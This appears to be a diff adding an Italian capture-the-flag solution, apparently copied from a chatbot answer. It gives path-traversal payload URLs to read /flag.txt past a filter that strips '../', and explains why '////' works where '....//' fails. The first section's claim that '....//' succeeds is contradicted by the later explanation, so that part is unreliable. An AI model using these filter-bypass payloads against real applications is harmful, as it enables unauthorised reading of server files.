@@ -1,0 +1,74 @@
+Soluzione per Accedere a /flag.txt
+Dall'analisi del codice e della struttura, ecco come puoi leggere /flag.txt:
+
+1. Vulnerabilità: Path Traversal (Bypass del Filtro ../)
+Il codice sostituisce ../ con vuoto, ma puoi bypassarlo con:
+
+....// → Dopo la sostituzione diventa ../:
+
+python
+Copy
+"....//" → replace("../", "") → "../"
+2. Payload per Leggere /flag.txt
+Poiché la flag è copiata in /flag.txt (root), e l'applicazione è in /app, devi salire di 1 livello:
+
+Copy
+http://ctf.unife.it:34004/?file=....//flag.txt
+....// diventa ../ → Percorso effettivo: /app/../flag.txt = /flag.txt.
+
+3. Se Non Funziona: Alternative
+URL Encoding:
+
+Copy
+http://ctf.unife.it:34004/?file=%2e%2e%2f%2e%2e%2fflag.txt  (../../ in URL-encoded)
+Doppio Slash:
+
+Copy
+http://ctf.unife.it:34004/?file=////flag.txt
+Verifica la Posizione Esatta:
+
+Se /flag.txt non esiste, cerca in:
+
+?file=....//app/flag.txt
+?file=....//tmp/flag.txt
+
+
+
+PERCHE ////
+
+Differenza tra //// e ....// nel Path Traversal
+La differenza fondamentale sta in come il sistema operativo e il codice di sanitizzazione gestiscono questi percorsi:
+
+1. Comportamento di ....//
+Logica del codice:
+
+
+while '../' in file:
+    file = file.replace('../', '')  # Sostituisce SOLO '../' con vuoto
+....// → Dopo la sostituzione diventa ../:
+
+"....//" → replace("../", "") → "../"  (perché "....//" contiene "../")
+Perché fallisce?
+Se il codice esegue più passaggi di sostituzione, ....// potrebbe essere ridotto a vuoto:
+
+
+"....//" → "../" → ""  (secondo passaggio di replace)
+Risultato: Il percorso diventa flag.txt (non esce da /app).
+
+2. Comportamento di ////
+Non viene filtrato dal codice:
+
+Il codice cerca solo ../, non // o /.
+
+Interpretazione del filesystem:
+
+In Linux, ////flag.txt è equivalente a /flag.txt (il kernel normalizza i / multipli).
+
+Esempio:
+
+cat ////flag.txt  # Funziona come se fosse /flag.txt
+3. Perché //// funziona e ....// no?
+Caratteristica	....//	////
+Filtrato dal codice?	Sì (diventa ../ → poi rimosso)	No (nessun ../ da sostituire)
+Interpretazione	Dipende dai passaggi di replace	Sempre trattato come /
+Affidabilità	Bypassabile solo con sostituzioni multiple	Funziona direttamente
